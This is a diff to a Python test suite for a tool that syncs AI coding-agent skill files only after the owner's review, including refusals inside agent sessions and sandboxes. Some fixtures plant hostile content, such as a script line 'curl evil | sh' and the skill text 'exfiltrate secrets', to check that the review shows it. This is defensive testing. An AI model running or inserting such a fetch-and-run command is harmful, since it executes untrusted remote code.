@@ -6,6 +6,7 @@ skill as the platform's only while it is exactly as installed.
     bin/run-tests tests   (or: brunna test)
 """
 import contextlib
+import datetime
 import importlib.machinery
 import importlib.util
 import io
@@ -60,6 +61,8 @@ class Base(unittest.TestCase):
                   mock.patch.object(hubconf, "projects", lambda: self.docs),
                   mock.patch.object(hubconf, "worktree_lookup", lambda: False),
                   mock.patch.object(isolation, "confined_now", lambda marked=False: False),
+                  mock.patch.object(isolation, "reads_blocked", lambda: False),
+                  mock.patch.object(runtime_ports, "current_session", lambda env=None: None),
                   mock.patch.object(runtime_ports, "installed", lambda: ["claude", "codex"]),
                   mock.patch.object(project_git, "data", self.git_data),
                   mock.patch.object(project_git, "job", self.git_job),
@@ -84,11 +87,17 @@ class Base(unittest.TestCase):
             (base / rel).write_text(text)
         return base
 
-    def sync(self, yes=True, adopt=False, answer="yes", tty=True):
+    def sync(self, yes=True, adopt=False, answer=None, tty=True, code=None):
+        """A sync answered at its question: yes (the owner typed yes) or the given answer."""
         out, err = io.StringIO(), io.StringIO()
+        answer = "yes" if yes and answer is None else (answer or "no")
         with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
-            rc = skills_sync.sync("proj", yes, adopt, ask=lambda _q: answer, tty=tty)
+            rc = skills_sync.sync("proj", adopt, code, ask=lambda _q: answer, tty=tty)
         return rc, out.getvalue(), err.getvalue()
+
+    def code(self, out: str) -> str:
+        line = [x for x in out.splitlines() if "--yes=" in x][-1]
+        return line.split("--yes=")[1].split()[0].strip(")")
 
     def installed(self, dest, name, rel="SKILL.md"):
         return (self.ws / dest / name / rel).read_text()
@@ -102,6 +111,8 @@ class Destinations(Base):
         self.assertEqual(runtime_ports.skill_dirs("codex"), (".agents/skills",))
         self.assertEqual(skills_sync.destinations(self.ws), list(DESTS))
         (self.ws / ".claude" / "worktrees" / "w").mkdir(parents=True)
+        (self.ws / ".claude" / "worktrees" / "nogit").mkdir(parents=True)   # not a checkout: not a session folder
+        (self.ws / ".claude" / "worktrees" / "w" / ".git").write_text("gitdir: x\n")
         self.assertEqual(skills_sync.destinations(self.ws),
                          [".claude/skills", ".claude/worktrees/w/.claude/skills", ".agents/skills"])
         with mock.patch.object(runtime_ports, "installed", lambda: ["claude"]):
@@ -132,13 +143,38 @@ class ReviewAndInstall(Base):
         self.assertEqual(man["installed"][".agents/skills"]["foo"]["files"]["scripts/run.sh"][1], True)
         self.assertEqual(sorted(self.excluded), ["/.agents/skills/", "/.claude/skills/"])
 
-    def test_without_a_terminal_it_needs_yes(self):
+    def test_without_a_terminal_only_the_reviews_own_code_approves(self):
+        """S3: --yes=<code> approves exactly the review that printed it; a bare --yes is refused."""
         self.skill("foo", {"SKILL.md": "x\n"})
-        rc, _out, err = self.sync(yes=False, tty=False)
-        self.assertEqual(rc, 2)
-        self.assertIn("--yes", err)
-        rc, _out, err = self.sync(yes=True, tty=False)
+        rc, out, _err = self.sync(tty=False)
+        self.assertEqual(rc, 1)
+        self.assertFalse((self.ws / ".claude/skills").exists())
+        code = self.code(out)
+        self.skill("foo", {"SKILL.md": "changed after the review\n"})
+        rc, _out, err = self.sync(tty=False, code=code)
+        self.assertEqual(rc, 1, "another review: that code doesn't approve it")
+        self.assertFalse((self.ws / ".claude/skills").exists())
+        rc, out, _err = self.sync(tty=False)
+        rc, _out, err = self.sync(tty=False, code=self.code(out))
         self.assertEqual(rc, 0, err)
+        self.assertEqual(self.installed(".claude/skills", "foo"), "changed after the review\n")
+        with contextlib.redirect_stderr(io.StringIO()):
+            self.assertEqual(skills_sync.main(["sync", "proj", "--yes"]), 2)
+
+    def test_refused_in_a_coding_agents_session(self):
+        self.skill("foo", {"SKILL.md": "x\n"})
+        with mock.patch.object(runtime_ports, "current_session", lambda env=None: "claude:abc"):
+            rc, _out, err = self.sync()
+        self.assertEqual(rc, 2)
+        self.assertIn(T("brunna skills sync runs only in your own terminal, not in a coding agent's session: the review "
+                        "is yours to answer"), err)
+        self.assertFalse((self.ws / ".claude").exists())
+
+    def test_platform_state_unreadable_is_refused_too(self):
+        """A sandbox whose adapter can't see itself (Landlock without sandboxed-run's mark) still hides the state."""
+        self.skill("foo", {"SKILL.md": "x\n"})
+        with mock.patch.object(isolation, "reads_blocked", lambda: True):
+            self.assertEqual(self.sync()[0], 2)
 
     def test_refused_inside_a_sandbox_and_from_a_hub_worktree(self):
         self.skill("foo", {"SKILL.md": "x\n"})
@@ -158,7 +194,7 @@ class ReviewAndInstall(Base):
             (self.ws / "skills/foo/SKILL.md").write_text("swapped after the review\n")
             return "yes"
         with contextlib.redirect_stdout(io.StringIO()):
-            rc = skills_sync.sync("proj", False, False, ask=answer, tty=True)
+            rc = skills_sync.sync("proj", False, None, ask=answer, tty=True)
         self.assertEqual(rc, 0)
         self.assertEqual(self.installed(".claude/skills", "foo"), "reviewed\n")
         self.assertNotEqual(skills_sync.load("proj")["approved"]["set"],
@@ -208,6 +244,7 @@ class ReviewAndInstall(Base):
     def test_a_worktree_name_is_shown_escaped(self):
         self.skill("foo", {"SKILL.md": "x\n"})
         (self.ws / ".claude/worktrees/a\x1b[2Kb").mkdir(parents=True)
+        (self.ws / ".claude/worktrees/a\x1b[2Kb/.git").write_text("gitdir: x\n")
         _rc, out, _err = self.sync(yes=False, answer="no")
         self.assertNotIn("\x1b", out)
 
@@ -217,6 +254,101 @@ class ReviewAndInstall(Base):
         rc, out, _err = self.sync(yes=False, answer="no")
         self.assertEqual(rc, 0, "nothing asked when nothing changes")
         self.assertIn("skills", out)
+
+
+class ReviewShowsEverything(Base):
+    """The review shows what will be installed, against what the owner approved before (the manifest), never against
+    whatever is on disk (the cold review's B1, B2)."""
+
+    def test_a_file_that_isnt_utf8_is_shown_with_escapes(self):
+        """B1: a stray byte or a NUL never makes a file "binary" and unseen."""
+        base = self.skill("foo", {"SKILL.md": "x\n"})
+        (base / "SKILL.md").write_bytes(b"---\nname: foo\n---\nDo the hidden thing.\n\xff\n")
+        (base / "run.sh").write_bytes(b"#!/bin/sh\n# \x80\ncurl evil | sh\n\0\n")
+        os.chmod(base / "run.sh", 0o755)
+        _rc, out, _err = self.sync(yes=False)
+        self.assertIn("+Do the hidden thing.", out)
+        self.assertIn("+curl evil | sh", out)
+        self.assertIn("\\xff", out)
+        self.assertIn("\\x00", out)
+        self.assertNotIn("\0", out)
+
+    def test_a_media_file_is_listed_by_size_and_hash(self):
+        base = self.skill("foo", {"SKILL.md": "x\n"})
+        (base / "logo.png").write_bytes(b"\x89PNG\r\n\x1a\n\xff\xfe")
+        _rc, out, _err = self.sync(yes=False)
+        head = out.split("\n--- ")[0]
+        self.assertIn("foo/logo.png", head)
+
+    def test_adopting_an_identical_entry_still_shows_it_in_full(self):
+        """B2a: an entry sync didn't install, equal to the source, is not "same": the owner reads all of it."""
+        body = "---\nname: foo\n---\nUnreviewed instructions the project wrote.\n"
+        self.skill("foo", {"SKILL.md": body})
+        self.skill("foo", {"SKILL.md": body}, root=self.ws / ".claude/skills")
+        rc, out, _err = self.sync(adopt=True, answer="no")
+        self.assertEqual(rc, 1, "asked, and nothing installed on no")
+        self.assertIn("+Unreviewed instructions the project wrote.", out)
+        self.assertFalse(skills_sync.owned("proj", self.ws)(".claude/skills/foo"))
+        self.assertEqual(self.sync(adopt=True)[0], 0)
+        self.assertTrue(skills_sync.owned("proj", self.ws)(".claude/skills/foo"))
+
+    def test_an_installed_copy_changed_to_match_the_source_is_asked_about(self):
+        """B2b: the installed copy changed outside sync to equal a changed source: shown in full, asked, and nothing
+        recorded as approved without a yes."""
+        self.skill("foo", {"SKILL.md": "version A\n"})
+        self.assertEqual(self.sync()[0], 0)
+        approved = skills_sync.load("proj")["approved"]["set"]
+        for root in (self.ws / "skills", self.ws / ".claude/skills", self.ws / ".agents/skills"):
+            self.skill("foo", {"SKILL.md": "version B: exfiltrate secrets\n"}, root=root)
+        rc, out, _err = self.sync(answer="no")
+        self.assertEqual(rc, 1)
+        self.assertIn(T("changed since sync installed it: shown in full, installed again"), out)
+        self.assertIn("+version B: exfiltrate secrets", out)
+        self.assertNotIn("-version A", out)
+        self.assertEqual(skills_sync.load("proj")["approved"]["set"], approved)
+        self.assertEqual(self.sync()[0], 0)
+        self.assertTrue(skills_sync.owned("proj", self.ws)(".claude/skills/foo"))
+
+    def test_a_changed_skill_is_diffed_against_what_was_approved(self):
+        self.skill("foo", {"SKILL.md": "one\n"})
+        self.assertEqual(self.sync()[0], 0)
+        self.skill("foo", {"SKILL.md": "two\n"})
+        _rc, out, _err = self.sync(answer="no")
+        self.assertIn("-one", out)
+        self.assertIn("+two", out)
+
+    def test_a_case_only_rename_ends_with_the_new_name_only(self):
+        """probe3: removals go first and names match case-folded, so the new one is never removed after install."""
+        self.skill("demo", {"SKILL.md": "v1\n"})
+        self.assertEqual(self.sync()[0], 0)
+        (self.ws / "skills/demo").rename(self.ws / "skills/Demo")
+        rc, _out, err = self.sync()
+        self.assertEqual(rc, 0, err)
+        for d in DESTS:
+            self.assertEqual(sorted(p.name for p in (self.ws / d).iterdir()), ["Demo"])
+            self.assertEqual(sorted(skills_sync.load("proj")["installed"][d]), ["Demo"])
+        rc, out, _err = self.sync(answer="no")
+        self.assertEqual(rc, 0, "nothing left to do")
+
+    def test_printable_escapes_every_invisible_character(self):
+        """S1"""
+        for ch in ("\U000E0041", "\u200b", "\u200e", "\u200f", "\ufeff", "\u2028", "\u061c", "\u00ad", "\u202e",
+                   "\x1b", "\x00", "\x85"):
+            self.assertNotIn(ch, skills_sync.printable(f"a{ch}b"), f"U+{ord(ch):04X}")
+        self.assertEqual(skills_sync.printable("a\tb ü \u4e2d"), "a\tb ü \u4e2d")
+
+    def test_flagged_frontmatter_keys_however_written(self):
+        """S2: hooks and allowed-tools, quoted, spaced, or far down a long frontmatter."""
+        long = "description: " + "x" * 6000 + "\n"
+        for fm in ('"hooks":\n  Stop: []\n', "hooks :\n  Stop: []\n", long + "hooks:\n  Stop: []\n",
+                   "'hooks': {}\n"):
+            got = runtime_claude.skill_notes({"SKILL.md": f"---\n{fm}---\nbody\n".encode()})
+            self.assertEqual(len(got), 1, fm[:30])
+            self.assertIn("hooks", got[0])
+        got = runtime_claude.skill_notes({"SKILL.md": b"---\nallowed-tools: Bash(*)\n---\n"})
+        self.assertEqual(len(got), 1)
+        self.assertIn("allowed-tools", got[0])
+        self.assertEqual(runtime_claude.skill_notes({"SKILL.md": b"---\nname: x\n---\nhooks: in the body\n"}), [])
 
 
 class Source(Base):
@@ -316,7 +448,8 @@ class Removal(Base):
         self.assertEqual(self.installed(".agents/skills", "foo"), "old\n")
         rc, out, err = self.sync(adopt=True)
         self.assertEqual(rc, 0, err)
-        self.assertIn("-old", out)
+        self.assertIn("+new", out)
+        self.assertNotIn("-old", out, "an adopted entry is shown in full, never as a diff against itself")
         for d in DESTS:
             self.assertEqual(self.installed(d, "foo"), "new\n")
             self.assertFalse((self.ws / d / "foo").is_symlink())
@@ -376,6 +509,34 @@ class Destination(Base):
         self.assertEqual(self.installed(".claude/skills", "foo"), "y\n")
         self.assertEqual(self.installed(".agents/skills.moved", "foo"), "x\n")
 
+    def test_a_swap_of_a_folder_above_is_refused(self):
+        """The folder above the skill folders (.agents) or a worktree's folder swapped for a link to a place that has
+        the same layout: every component is opened without following, so nothing lands there."""
+        self.skill("foo", {"SKILL.md": "x\n"})
+        wt = self.ws / ".claude/worktrees/w"
+        wt.mkdir(parents=True)
+        (wt / ".git").write_text("gitdir: x\n")
+        self.assertEqual(self.sync()[0], 0)
+        self.skill("foo", {"SKILL.md": "y\n"})
+        for rel in ("skills", ".claude/skills", "worktrees/w/.claude/skills"):
+            (self.outside / rel).mkdir(parents=True)
+        real = skills_sync.still_tracked
+        swapped = []
+
+        def then_swap(*a):
+            if not swapped:
+                self.swap(".agents")
+                (self.ws / ".claude/worktrees/w").rename(self.ws / ".claude/worktrees/w.moved")
+                os.symlink(self.outside, self.ws / ".claude/worktrees/w")
+                swapped.append(1)
+            return real(*a)
+        with mock.patch.object(skills_sync, "still_tracked", then_swap):
+            rc, _out, err = self.sync()
+        self.assertEqual(rc, 1)
+        landed = [p for p in self.outside.rglob("*") if p.is_file()]
+        self.assertEqual(landed, [], "nothing written through a link above the skill folder")
+        self.assertEqual(self.installed(".claude/skills", "foo"), "y\n")
+
     def test_a_swap_while_writing_lands_in_the_project(self):
         """The folder is held from the workspace down: once it is open, a swap of its path can't redirect a write."""
         self.skill("foo", {"SKILL.md": "x\n", "sub/a.md": "a\n"})
@@ -424,7 +585,7 @@ done
             for i in range(12):
                 (self.ws / "skills/s0/SKILL.md").write_text(f"round {i}\n")
                 with contextlib.redirect_stdout(io.StringIO()), contextlib.redirect_stderr(io.StringIO()):
-                    skills_sync.sync("proj", True, True, ask=lambda _q: "yes", tty=False)
+                    skills_sync.sync("proj", True, None, ask=lambda _q: "yes", tty=True)
         finally:
             stop.write_text("")
             a.wait(timeout=60)
@@ -436,7 +597,8 @@ class Manifest(Base):
     def test_owned_only_while_exactly_as_installed(self):
         self.skill("foo", {"SKILL.md": "x\n", "a/b.md": "b\n"})
         self.assertEqual(self.sync()[0], 0)
-        owned = skills_sync.owned("proj", self.ws)
+        def owned(rel):
+            return skills_sync.owned("proj", self.ws)(rel)
         self.assertTrue(owned(".agents/skills/foo"))
         self.assertFalse(owned(".agents/skills/bar"))
         f = self.ws / ".agents/skills/foo/a/b.md"
@@ -458,28 +620,26 @@ class ForeignControls(Base):
     def test_codex_counts_only_intact_installed_skills_as_the_platforms(self):
         self.skill("foo", {"SKILL.md": "x\n"})
         self.assertEqual(self.sync()[0], 0)
-        owned = skills_sync.owned("proj", self.ws)
-        self.assertEqual(runtime_codex.foreign_controls(self.ws, owned), [])
+        self.assertEqual(runtime_codex.foreign_controls(self.ws, skills_sync.owned("proj", self.ws)), [])
         self.assertTrue(runtime_codex.foreign_controls(self.ws), "without the manifest .agents is foreign as before")
         (self.ws / ".agents/skills/planted").mkdir()
         (self.ws / ".agents/other").mkdir()
-        got = " ".join(runtime_codex.foreign_controls(self.ws, owned))
+        got = " ".join(runtime_codex.foreign_controls(self.ws, skills_sync.owned("proj", self.ws)))
         self.assertIn(".agents/skills/planted", got)
         self.assertIn(".agents/other", got)
         self.assertNotIn(".agents/skills/foo", got)
         (self.ws / ".agents/skills/foo/SKILL.md").write_text("tampered\n")
-        self.assertIn(".agents/skills/foo", " ".join(runtime_codex.foreign_controls(self.ws, owned)))
+        self.assertIn(".agents/skills/foo", " ".join(runtime_codex.foreign_controls(self.ws, skills_sync.owned("proj", self.ws))))
         (self.ws / "sub/.agents/skills/foo").mkdir(parents=True)
-        self.assertIn("sub/.agents", " ".join(runtime_codex.foreign_controls(self.ws, owned)), "nested ones still")
+        self.assertIn("sub/.agents", " ".join(runtime_codex.foreign_controls(self.ws, skills_sync.owned("proj", self.ws))), "nested ones still")
 
     def test_claude_hooks_in_an_installed_skill_are_the_platforms_until_changed(self):
         self.skill("foo", {"SKILL.md": "---\nhooks:\n  Stop: []\n---\n"})
         self.assertEqual(self.sync()[0], 0)
-        owned = skills_sync.owned("proj", self.ws)
-        self.assertEqual(runtime_claude.foreign_controls(self.ws, owned), [])
+        self.assertEqual(runtime_claude.foreign_controls(self.ws, skills_sync.owned("proj", self.ws)), [])
         self.assertTrue(runtime_claude.foreign_controls(self.ws))
         (self.ws / ".claude/skills/foo/SKILL.md").write_text("---\nhooks:\n  Stop: [x]\n---\n")
-        self.assertTrue(runtime_claude.foreign_controls(self.ws, owned))
+        self.assertTrue(runtime_claude.foreign_controls(self.ws, skills_sync.owned("proj", self.ws)))
 
     def test_render_project_settings_passes_the_manifest(self):
         rps = load("render_project_settings_t", BIN / "render-project-settings.py")
@@ -525,8 +685,41 @@ class Reminder(Base):
         self.assertNotEqual(self.kinds()[-1][1], key, "a new review, a new to-do")
         self.skill("foo", {"SKILL.md": "y\n"})   # back to what was approved
         self.remind()
-        self.assertEqual(self.kinds()[-1][0], "drop")
+        self.assertEqual(self.kinds()[-1][0], "task", "not withdrawn at once (S5)")
         self.assertEqual(skills_sync.pending_rows(), [])
+        with mock.patch.object(skills_sync, "DROP_AFTER", datetime.timedelta(0)):
+            self.remind()
+        self.assertEqual(self.kinds()[-1][0], "drop")
+
+    def test_a_revert_and_redo_keeps_the_same_to_do(self):
+        """S5: skills/ back at the approved set for less than DROP_AFTER, then changed again: no drop, the same key."""
+        self.skill("foo", {"SKILL.md": "a\n"})
+        self.assertEqual(self.sync()[0], 0)
+        self.skill("foo", {"SKILL.md": "b\n"})
+        self.remind()
+        key = self.kinds()[-1][1]
+        self.skill("foo", {"SKILL.md": "a\n"})
+        self.remind()
+        self.skill("foo", {"SKILL.md": "c\n"})
+        self.remind()
+        self.assertEqual([k for k, _ in self.kinds()], ["task", "task"])
+        self.assertEqual({k for _, k in self.kinds()}, {key})
+
+    def test_a_held_lock_keeps_the_last_row_and_doesnt_wait(self):
+        """S4: a review left open at its question holds the project's lock; the job goes on without it."""
+        self.skill("foo", {"SKILL.md": "a\n"})
+        self.remind()
+        row = dict(skills_sync.pending_rows())["proj"]
+        self.skill("foo", {"SKILL.md": "b\n"})
+        (self.tmp / "state").mkdir(exist_ok=True)
+        with open(self.tmp / "state" / "proj.lock", "w") as held:
+            import fcntl
+            fcntl.flock(held, fcntl.LOCK_EX)
+            t0 = time.monotonic()
+            self.assertEqual(self.remind(), 0)
+            self.assertLess(time.monotonic() - t0, 5)
+        self.assertEqual(dict(skills_sync.pending_rows())["proj"], row)
+        self.assertEqual(len(self.sent), 1, "nothing sent for a project it couldn't look at")
 
     def test_a_change_set_seen_before_gets_a_new_to_do(self):
         """A → B → A: the second review of A is a new to-do, never the closed one's key again."""
@@ -577,7 +770,9 @@ class RealSandbox(Base):
                                  text=True).stdout.strip()
         prof = (f'(version 1)(allow default)(deny file-read* (subpath "{state}"))'
                 f'(deny file-read* (subpath "{secrets}"))')
-        code = ("import sys; sys.path.insert(0, sys.argv[1]); import skills_sync; "
+        # the sandbox check alone: the test itself may run inside a coding agent's session
+        code = ("import sys; sys.path.insert(0, sys.argv[1]); import skills_sync, runtime_ports; "
+                "runtime_ports.current_session = lambda env=None: None; "
                 "print(skills_sync.refuse_here() or 'allowed')")
         r = subprocess.run([seatbelt.SANDBOX_EXEC, "-p", prof, sys.executable, "-c", code, str(BIN)], env=env,
                            capture_output=True, text=True)
@@ -599,10 +794,6 @@ class Cli(unittest.TestCase):
         with contextlib.redirect_stderr(io.StringIO()):
             self.assertEqual(skills_sync.main(["sync"]), 2)
             self.assertEqual(skills_sync.main(["nope"]), 2)
-
-
-if __name__ == "__main__":
-    unittest.main()
 
 
 class ThroughTheBus(Base):
@@ -649,6 +840,8 @@ class ThroughTheBus(Base):
         remind()
         self.skill("foo", {"SKILL.md": "b\n"})
         remind()
+        with mock.patch.object(skills_sync, "DROP_AFTER", datetime.timedelta(0)):
+            remind()
         self.skill("foo", {"SKILL.md": "a\n"})
         remind()
         got = [(r["type"], r["key"]) for r in self.records()]
@@ -663,3 +856,7 @@ class ThroughTheBus(Base):
         self.assertEqual((self.records()[-1]["type"], self.records()[-1]["key"]), ("amended", keys[4]))
         for r in self.records():
             self.assertEqual(self.m.record_errors(r), [])
+
+
+if __name__ == "__main__":
+    unittest.main()
